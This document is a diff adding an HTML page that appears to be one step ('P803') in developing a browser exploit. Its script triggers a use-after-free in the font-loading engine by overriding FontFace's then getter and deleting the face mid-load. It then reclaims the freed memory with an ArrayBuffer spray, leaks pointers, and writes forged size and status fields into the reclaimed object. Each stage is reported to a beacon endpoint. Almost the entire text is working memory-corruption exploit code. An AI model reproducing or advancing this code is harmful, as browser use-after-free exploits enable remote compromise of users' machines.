@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P803 — Re-add face + layout force</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P803 — Re-add face + layout force
+ *
+ * P802 showed: layout with m_size=1 survived but NO new writes.
+ * REASON: fonts.delete() removed the face from the font set.
+ * The layout engine never finds our AB because it's not in
+ * document.fonts anymore.
+ *
+ * FIX: Re-add face1 to document.fonts AFTER the UAF.
+ * Then the layout engine WILL access our AB for font matching.
+ *
+ * Each step beacons separately so we know exactly where a crash
+ * occurs: READD, SPAN, LAYOUT, CHECK, DUMP.
+ *
+ * PHASES:
+ *   A: Re-add + layout (m_size=1, no status tweak)
+ *   B: Re-add + fonts.check only (no layout)
+ *   C: Re-add + layout with q2=3 (attempt Status::Loaded at +0x10)
+ *   D: Re-add + layout with q2=0x300 (Status at byte 1)
+ *   E: Re-add + layout with q2=0x30000 (Status at byte 2)
+ *   F: Re-add + layout with q2=0x3000000 (Status at byte 3)
+ *
+ * CRASH_CLASS: HIGH — vtable dispatch through freed source
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P803-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P803-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+var PHASES = ['A','B','C','D','E','F'];
+
+function getPhase(){
+  try { return localStorage.getItem('p803_phase') || 'A'; } catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p803_phase', p); } catch(e){}
+}
+
+function dumpAB(label, view){
+  var nz = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) nz.push('q' + q + '=0x' + h16(view[q]));
+  }
+  b(label, nz.join('|').slice(0, 700));
+  log(label + ': ' + (nz.length > 0 ? nz.join(' ') : '(all zero)'));
+  return nz;
+}
+
+function rawDump(label, view){
+  var raw = '';
+  for (var q = 0; q < 12; q++) raw += h16(view[q]);
+  b(label + '-R1', raw);
+  raw = '';
+  for (var q = 12; q < 24; q++) raw += h16(view[q]);
+  b(label + '-R2', raw);
+}
+
+var face1_ref = null;
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  var idx = PHASES.indexOf(phase);
+  if (idx < 0 || idx >= PHASES.length){
+    b('DONE', 'all_phases_complete');
+    log('All phases complete!');
+    try { localStorage.removeItem('p803_phase'); } catch(e){}
+    return;
+  }
+
+  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
+  setPhase(nextPhase);
+
+  b('BOOT', 'phase=' + phase);
+  log('P803 — Re-add Layout — Phase ' + phase + '\n');
+
+  /* ===== UAF ===== */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:ws1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('wf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  face1_ref = face1;
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em ws1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em wf1, ws1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(phase + '-P1-MISS', 'no_reclaim');
+      log('P1 MISS, retrying...');
+      setPhase(phase);
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    var self1 = q11_1 - 0x68n;
+
+    b(phase + '-P1', 'self=0x' + h16(self1) + '|q13=0x' + h16(q13_1));
+    log('P1: self=0x' + h16(self1) + ' q13=0x' + h16(q13_1));
+
+    dumpAB(phase + '-BASE', view1);
+
+    /* ===== Inject m_size=1 for ALL phases ===== */
+    view1[12] = 0x0000000100000001n; /* cap=1, size=1 */
+    b(phase + '-SIZE', 'q12=cap1_size1');
+
+    /* ===== PHASE-SPECIFIC STATUS TWEAKS ===== */
+    var statusVal = 0n;
+    if (phase === 'A') {
+      /* No status tweak — just re-add + layout */
+      statusVal = 0n;
+    } else if (phase === 'B') {
+      /* No status tweak — re-add + fonts.check only */
+      statusVal = 0n;
+    } else if (phase === 'C') {
+      statusVal = 3n;          /* Status::Loaded at byte 0 of q2 */
+    } else if (phase === 'D') {
+      statusVal = 0x300n;      /* Status::Loaded at byte 1 */
+    } else if (phase === 'E') {
+      statusVal = 0x30000n;    /* Status::Loaded at byte 2 */
+    } else if (phase === 'F') {
+      statusVal = 0x3000000n;  /* Status::Loaded at byte 3 */
+    }
+
+    if (statusVal !== 0n) {
+      view1[2] = statusVal;
+      b(phase + '-STATUS', 'q2=0x' + h16(statusVal));
+    }
+
+    /* ===== STEP 1: Re-add face1 to document.fonts ===== */
+    b(phase + '-S1-PRE', 'readd');
+    var addOk = false;
+    try {
+      document.fonts.add(face1_ref);
+      addOk = true;
+      b(phase + '-S1-OK', 'readded');
+    } catch(e){
+      b(phase + '-S1-ERR', e.message);
+    }
+
+    if (!addOk) {
+      b(phase + '-SKIP', 'add_failed');
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    if (phase === 'B') {
+      /* Phase B: fonts.check only, no layout */
+      b(phase + '-S2-PRE', 'check');
+      var checkResult = 'unknown';
+      try {
+        checkResult = String(document.fonts.check('1em wf1', 'A'));
+        b(phase + '-S2-CHECK', checkResult);
+      } catch(e){
+        b(phase + '-S2-CHECK-ERR', e.message);
+      }
+
+      b(phase + '-S3-PRE', 'dump');
+      dumpAB(phase + '-POST', view1);
+      rawDump(phase + '-POST', view1);
+
+      setTimeout(function(){
+        dumpAB(phase + '-T2000', view1);
+        log('\nPhase ' + phase + ' complete.');
+        setTimeout(function(){ location.reload(); }, 800);
+      }, 1500);
+      return;
+    }
+
+    /* ===== STEP 2: Create span ===== */
+    b(phase + '-S2-PRE', 'span');
+    var span = document.createElement('span');
+    span.style.fontFamily = 'wf1, serif';
+    span.style.fontSize = '48px';
+    span.textContent = 'ABCDEFGH';
+    document.body.appendChild(span);
+    b(phase + '-S2-OK', 'span_added');
+
+    /* ===== STEP 3: Force layout ===== */
+    b(phase + '-S3-PRE', 'layout');
+    try { var h = document.body.offsetHeight; } catch(e){}
+    b(phase + '-S3-OK', 'layout_forced');
+
+    /* ===== STEP 4: fonts.check ===== */
+    b(phase + '-S4-PRE', 'check');
+    var checkResult2 = 'unknown';
+    try {
+      checkResult2 = String(document.fonts.check('1em wf1', 'A'));
+      b(phase + '-S4-CHECK', checkResult2);
+    } catch(e){
+      b(phase + '-S4-CHECK-ERR', e.message);
+    }
+
+    /* ===== STEP 5: Dump ===== */
+    b(phase + '-S5-PRE', 'dump');
+    dumpAB(phase + '-POST', view1);
+    rawDump(phase + '-POST', view1);
+
+    setTimeout(function(){
+      dumpAB(phase + '-T2000', view1);
+      rawDump(phase + '-T2000', view1);
+      log('\nPhase ' + phase + ' complete.');
+      setTimeout(function(){ location.reload(); }, 800);
+    }, 1500);
+
+  }, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P803 — Re-add Layout Force — Loading...</pre>
+</body>
+</html>
